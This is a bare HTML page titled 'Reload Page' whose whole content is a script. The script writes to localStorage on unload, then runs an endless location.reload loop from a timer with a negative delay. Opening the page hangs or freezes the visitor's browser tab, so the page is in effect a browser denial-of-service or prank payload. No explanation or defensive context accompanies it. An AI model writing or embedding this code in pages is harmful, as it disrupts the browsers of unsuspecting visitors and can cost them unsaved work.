<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reload Page</title>
</head>
<body>
    <script>
        window.onbeforeunload = function() {
            localStorage.x = 1;
        };
        setTimeout(function() {
            while(1) location.reload(1);
        }, -1);
    </script>
</body>
</html>
